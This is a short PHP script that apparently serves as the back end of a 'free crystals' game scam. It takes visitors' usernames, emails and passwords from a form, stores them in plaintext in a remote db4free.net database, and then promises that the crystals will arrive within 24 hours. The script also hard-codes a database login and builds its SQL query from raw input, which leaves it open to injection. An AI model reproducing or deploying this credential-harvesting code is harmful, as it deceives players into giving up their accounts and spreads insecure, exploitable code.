<?php

  {  

    // Récupérez les données du formulaire
    $username = $_POST['username'];
    $email = $_POST['email'];
    $mot_de_pass = $_POST['mot_de_pass'];

    // Créez une connexion à la base de données
    $dsn =  'mysql:host=db4free.net;dbname=goldenfarm';
    $utilisateur = 'admin_users';
    $password = 'Base3624@';
    $pdo = new PDO($dsn, $utilisateur, $password);
 
    // Insérez les données dans la base de données
    $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
    $pdo->query($requete);

      // Message de succès
  echo "Congratulations, you will receive the cristaux within 24 hours, please close this page";
}

?>